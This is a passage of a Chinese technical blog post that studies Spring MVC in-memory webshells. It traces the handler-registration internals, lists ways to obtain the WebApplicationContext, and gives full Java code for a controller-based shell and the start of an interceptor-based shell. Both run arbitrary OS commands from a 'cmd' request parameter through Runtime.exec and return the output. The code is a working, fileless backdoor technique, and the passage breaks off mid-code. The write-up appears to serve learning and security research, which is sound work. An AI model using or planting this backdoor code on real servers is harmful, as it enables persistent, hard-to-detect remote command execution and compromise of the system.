class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--servlet核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--jsp核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--文件上传依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>springBoot用过之后觉得这配置好麻烦……</p>
<p>接着创建resources目录配置spring和springMVC的配置文件</p>
<p>大体目录结构</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002418321.png" alt="image-20220422002418321"></p>
<p>配置文件自定义,右键new选择spring Config</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002516259.png" alt="image-20220422002516259" style="zoom:80%;" />

<p>spring配置文件,命名自定义,后面在web.xml中写对应就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">        &quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Spring配置文件：除了控制器之外的bean对象都在这被扫描 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.test.service&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>springMVC配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">        http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd</span><br><span class="line">        &quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- SpringMVC配置文件：控制器的bean对象在这被扫描 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.test.controller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--    启动mvc的注解--&gt;</span><br><span class="line">    &lt;mvc:annotation-driven/&gt;</span><br><span class="line">    &lt;!--    配置视图解析器的配置--&gt;                                  &lt;!--    调用视图解析器的方法：InternalResourceViewResolver--&gt;</span><br><span class="line">    &lt;bean id=&quot;internalResourceViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;!-- 前缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/&quot;/&gt;&lt;!--默认访问路径是webapp根路径下的，如果webapp下还有其他文件夹就写:/webapp/文件夹名--&gt;</span><br><span class="line">        &lt;!-- 后缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;&lt;!-- 如果是index.html文件，就写html --&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后,web.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">   &lt;!--这里需要版本为4.0,maven创建的好像是2点多的--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--    Spring配置--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        1、让监听器知道spring的配置文件的位置--&gt;</span><br><span class="line">  &lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;!-- spring配置文件的文件名 --&gt;</span><br><span class="line">    &lt;param-value&gt;classpath:springConfig.xml&lt;/param-value&gt;</span><br><span class="line">  &lt;/context-param&gt;</span><br><span class="line">  &lt;!--        2.创建监听器--&gt;</span><br><span class="line">  &lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">  &lt;/listener&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        springmvc的 核心\前端\中央 控制器--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--        servlet的封装--&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;!--            servlet读取springmvc的配置文件--&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">      &lt;!-- springmvc配置文件的文件名 --&gt;</span><br><span class="line">      &lt;param-value&gt;classpath:springMVC.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;!--            在容器创建servlet对象的优先级.    数字越小越先创建--&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p>首先从SpringMVC的controller内存马开始学习</p>
<p>在我个人看来,controller是对servlet的一种封装,所以实现原理方面来说,应该和servlet的实现原理比较像</p>
<ol>
<li>RequestMappingInfo类，对RequestMapping注解封装。里面包含http请求头的相关信息。如uri、method、params、header等参数。一个对象对应一个RequestMapping注解</li>
<li>HandlerMethod类，是对Controller的处理请求方法的封装。里面包含了该方法所属的bean对象、该方法对应的method对象、该方法的参数等。</li>
</ol>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174514491.png" alt="image-20220421174514491"></p>
<p>SpringMVC初始化的时候,对每个容器中的Bean的构造方法和属性设置之后,将会调用<code> InitializingBean</code>接口的<code>afterPropertiesSet</code>方法</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174800350.png" alt="image-20220421174800350" style="zoom:67%;" />

<p>其中实现类 RequestMappingHandlerMapping 用来处理具有 <code>@Controller</code> 注解类中的方法级别的 <code>@RequestMapping</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421175523028.png" alt="image-20220421175523028"></p>
<p>它的<code>afterPropertiesSet</code>先是对静态内部配置类进行了初始化,然后调用了其抽象父类的<code>afterPropertiesSet</code>方法</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180801171.png" alt="image-20220421180801171" style="zoom:80%;" />

<p>其抽象父类的对应方法中又调用了<code>initHandlerMethods</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180923594.png" alt="image-20220421180923594"></p>
<p>这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 <code>processCandidateBean</code> 方法处理 Bean。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181210684.png" alt="image-20220421181210684"></p>
<p>processCandidateBean中获取bean的类型并且符合isHandler要求就进行方法检测<code>detectHandlerMethods()</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181317837.png" alt="image-20220421181317837"></p>
<p>isHandler调用的是其方法实现类<code>RequestMappingHandlerMapping</code>中的isHandler,它判断了该bean的定义是否带有<code>@Controller</code>或<code>@RequestMapping</code>注解</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421182037996.png" alt="image-20220421182037996"></p>
<p>这关过去之后,就开始查找handler methods并注册,</p>
<p><code>handler method</code>通俗点讲其实就是controller中的方法</p>
<p>有一说一,这段代码还真不好理解</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421183153513.png" alt="image-20220421183153513"></p>
<p>这部分有两个关键功能，一个是 <code>getMappingForMethod</code> 方法根据 handler method 创建<code>RequestMappingInfo</code> 对象，一个是 <code>registerHandlerMethod</code> 方法将 handler method 与创建 <code>RequestMappingInfo </code>进行相关映射。</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184453462.png" alt="image-20220421184453462"></p>
<p>注册完成之后的信息都存在这样一个类中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184720102.png" alt="image-20220421184720102"></p>
<p><a href="https://www.cnblogs.com/w-y-c-m/p/8416630.html">详细请求调用流程</a></p>
<p>lookupPath就是请求的相对地址,比如/user/login</p>
<p>当一次请求进来的时候,首先会在<code>AbstractHandlerMethodMapping#lookupHandlerMethod</code>方法中获取直接匹配的<code>RequestMappingInfos</code>列表</p>
<p>如果没有匹配的<code>RequestMappingInfos</code>,则遍历所有的<code>MappingRegistry.mappingLookup</code>中保存的所有<code>RequestMappingInfos</code></p>
<p>最后,获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421185007532.png" alt="image-20220421185007532"></p>
<p>大概原理跟着顺了一遍</p>
<h2 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h2><p>想要添加内存马,都必须得获取context</p>
<p>不明所以,先把代码粘贴过来</p>
<p>能用的只有4和5了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1 ContextLoader类专门负责root application context初始化</span></span><br><span class="line"><span class="comment">// ContextLoader的一个主要方法就是 initWebApplicationContext</span></span><br><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</span></span><br><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3 类似2</span></span><br><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5</span></span><br><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取context应该算是所有内存马最重要的地方了吧,因为context作为上下文对象,它里面往往存储了很多承接多个功能模块的信息,这些信息中往往就存在着能注入内存马的部分</p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>获得的context不能<code>getBean(RequestMappingHandlerMapping.class)</code>,会抛出一个找不到这个bean的异常</p>
<p>下面两图分别是方法一和方法四获取到的context的区别,具体原因我猜测是因为在法一这个命名空间下没有RMSM这个bean的定义</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141432909.png" alt="image-20220422141432909"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141533441.png" alt="image-20220422141533441"></p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><p>也在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
<h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h5><p>方法四呢,联系这两天学习c#多线程学习到的东西就比较容易理解了,</p>
<p>该方法使用的是<code>RequestContextHolder</code>对象</p>
<p>该对象开头的注释大概可以理解为该类以线程绑定的形式暴露一个request对象,同时这个对象可以被所有当前线程产生的子线程继承</p>
<p>在不同的类中都可以拿到同一个对象实例，但不同的线程取到的实例不同我们将这种数据称之为<strong>线程本地变量</strong>，这种操作叫做<strong>线程绑定</strong>。(类似于针对线程将对象进行个性化定制)</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201339819.png" alt="image-20220422201339819"></p>
<p>使用<code>RequestContextHolder#getRequestAttributes()</code>方法返回一个reqeust的Attributes</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201815223.png" alt="image-20220422201815223"></p>
<p>从它的Attributes中获得对应的<code>WebApplicationContext</code>,并且命名空间也正常,可以使用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422202640251.png" alt="image-20220422202640251"></p>
<h5 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h5><p>在3.2.x以上版本可以使用 </p>
<p>这个方法看起来有点暴力</p>
<p><code>LiveBeansView</code>这个类中有一个applicationContext集合</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203055508.png" alt="image-20220422203055508"></p>
<p>直接通过反射获取即可,唯一说的一点就是static变量反射get的时候可以传null进去,原因呢就是static是所有对象共享的变量,大概这样理解吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对这个类的理解</p>
</blockquote>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203515764.png" alt="image-20220422203515764"></p>
<p>看了这个类源码中的注释,大概意思呢就是</p>
<p>这个类是生命周期还未结束的bean们的一个曝光适配器,建立了一个当前bean们和他们的依赖的快照</p>
<p>可以将bean和他们的依赖对应关系保存起来??</p>
<h5 id="获取RequestMappingHandlerMapping"><a href="#获取RequestMappingHandlerMapping" class="headerlink" title="获取RequestMappingHandlerMapping"></a>获取RequestMappingHandlerMapping</h5><p>首先需要获取<code>RequestMappingHandlerMapping</code>对象,有了这个对象,后面创建的RequestMappingInfo才能往里面注册</p>
<p><code>WebApplicationContext</code>继承了BeanFactory,可以用它里面的getBean方法获取<code>RequestMappingHandlerMapping</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>

<p>所以就要先获取<code>WebApplicationContext</code>才能获取到<code>RequestMappingHandlerMapping</code>对象</p>
<p>获取到<code>RequestMappingHandlerMapping</code>对象就可以开始构造<code>RequestMappingInfo</code>了,将写好的恶意内部类和恶意方法同构造好的<code>RequestMappingInfo</code>一起使用<code>requestMappingHandlerMapping#registerMapping</code>注册到<code>requestMappingHandlerMapping</code>中</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422112630154.png" alt="image-20220422112630154"></p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RequestMethodsRequestCondition requestMethodsRequestCondition = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        </span><br><span class="line">        Method method = injectController.class.getMethod(<span class="string">&quot;evil&quot;</span> );</span><br><span class="line">        RequestMappingInfo requestMappingInfo = <span class="keyword">new</span> RequestMappingInfo(url,requestMethodsRequestCondition,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        injectController injectController = <span class="keyword">new</span> injectController();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(requestMappingInfo,injectController,method);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">injectController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">evil</span><span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">     <span class="comment">//request也可以直接写成参数public String evil(HttpServletRequest request)</span></span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            </span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此,controller类型的内存马算是做了初步了解</p>
<h2 id="Inteceptor内存马"><a href="#Inteceptor内存马" class="headerlink" title="Inteceptor内存马"></a>Inteceptor内存马</h2><p>学习完controller内存马之后,就对spring基础的方法注册流程有了一个了解</p>
<p><code>AbstractHandlerMapping#adaptedInterceptors</code>中存储了HandlerInterceptor</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422121240656.png" alt="image-20220422121240656"></p>
<p>所以流程就很清晰了,首先获取到<code>AbstractHandlerMapping</code>,然后通过反射获取到<code>adaptedInterceptors</code>列表,往里面添加写好的恶意<code>interceptor</code>即可</p>
<p><code>AbstractHandlerMapping</code>的运行类还是<code>RequestMappingHandlerMapping</code>,所以getBean的时候还是填<code>RequestMappingHandlerMapping.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>在期间有个坑</p>
</blockquote>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123659126.png" alt="image-20220422123659126"></p>
<p>就是看似我获取到的是向上转型得到的AbstractHandlerMapping对象,但是我这里使用了getClass是错误的,</p>
<p>当前AbstractHandlerMapping对应的正在运行中的对象是RequestMappingHandlerMapping对象</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123824924.png" alt="image-20220422123824924"></p>
<p>一般呢子类是可以获取到父类的变量的,但是<code>adaptedInterceptors</code>是private修饰的,不能被子类继承,也就是说,子类中根本就没有这个字段,所以在这里需要通过<code>AbstractHandlerMapping.class</code>来获取<code>field</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422124507783.png" alt="image-20220422124507783"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">interController</span></span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/injectInter&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        Field declaredField = AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ArrayList list = (ArrayList) declaredField.get(abstractHandlerMapping);</span><br><span class="line">        list.add(<span class="keyword">new</span> evilInterceptor());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evilInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        